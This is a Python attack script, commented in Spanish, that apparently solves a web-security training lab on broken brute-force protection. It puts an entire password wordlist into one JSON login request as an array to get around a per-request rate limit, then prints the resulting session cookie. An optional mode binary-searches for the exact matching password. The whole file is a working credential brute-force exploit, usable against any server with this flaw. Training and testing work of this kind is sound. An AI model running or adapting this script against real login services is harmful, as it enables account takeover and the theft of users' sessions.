#!/usr/bin/env python3
"""
Brute-force one-shot del lab "Broken brute-force protection, multiple credentials
per request". El backend acepta JSON donde `password` puede ser array; el server
itera el array y devuelve exito si cualquier elemento matchea. Rate-limit cuenta
requests, no candidatos. 100 candidatos = 1 request.

Modos:
  --mode oneshot  : envia los 100 candidatos en una sola request (default).
  --mode bsearch  : binary search para identificar exactamente cual matcheo
                    (~log2(N) requests, util para forensics/reporting).

Uso:
    python3 bruteforce.py --host <lab-host> [--target carlos] [--mode oneshot]

Ejemplo:
    python3 bruteforce.py \\
        --host 0abf0082042ccc71801c30b200e40078.web-security-academy.net
"""

import argparse
import json
import sys
from pathlib import Path

import requests


def post_login(host: str, target: str, candidates: list[str]) -> requests.Response:
    payload = json.dumps({"username": target, "password": candidates},
                         separators=(",", ":"))
    return requests.post(f"https://{host}/login",
                         headers={"Content-Type": "application/json"},
                         data=payload, allow_redirects=False, timeout=15)


def oneshot(host: str, target: str, candidates: list[str]) -> str | None:
    print(f"[*] Enviando {len(candidates)} candidatos en una sola request")
    r = post_login(host, target, candidates)
    if r.status_code == 302 and "/my-account" in r.headers.get("Location", ""):
        session = r.cookies.get("session")
        print(f"[+] LOGIN OK  -> Location: {r.headers['Location']}")
        print(f"[+] Cookie session: {session}")
        return session
    print(f"[!] Login fallido (status {r.status_code}). El password no esta "
          "en el wordlist o el vector no aplica.")
    return None


def bsearch(host: str, target: str, candidates: list[str]) -> str | None:
    """Binary search para identificar el password exacto. log2(N) requests."""
    print(f"[*] Binary search sobre {len(candidates)} candidatos")
    while len(candidates) > 1:
        mid = len(candidates) // 2
        left = candidates[:mid]
        r = post_login(host, target, left)
        if r.status_code == 302:
            candidates = left
        else:
            candidates = candidates[mid:]
        print(f"    narrowed to {len(candidates)}")
    if len(candidates) == 1:
        # Confirmar que el ultimo candidato realmente matchea
        r = post_login(host, target, candidates)
        if r.status_code == 302:
            print(f"[+] Password identificado: {candidates[0]}")
            return candidates[0]
    print("[!] Binary search no convergio.")
    return None


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--host", required=True, help="Lab host")
    p.add_argument("--target", default="carlos", help="Username objetivo")
    p.add_argument("--wordlist", default="passwords.txt")
    p.add_argument("--mode", choices=["oneshot", "bsearch"], default="oneshot")
    args = p.parse_args()

    wordlist_path = Path(args.wordlist)
    if not wordlist_path.exists():
        print(f"[!] Wordlist no encontrado: {wordlist_path}")
        sys.exit(2)

    candidates = [line.strip() for line in wordlist_path.read_text().splitlines()
                  if line.strip()]

    print(f"[*] Target: {args.host}")
    print(f"[*] User objetivo: {args.target}")
    print(f"[*] Wordlist: {len(candidates)} candidatos")
    print(f"[*] Modo: {args.mode}")

    if args.mode == "oneshot":
        result = oneshot(args.host, args.target, candidates)
    else:
        result = bsearch(args.host, args.target, candidates)

    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
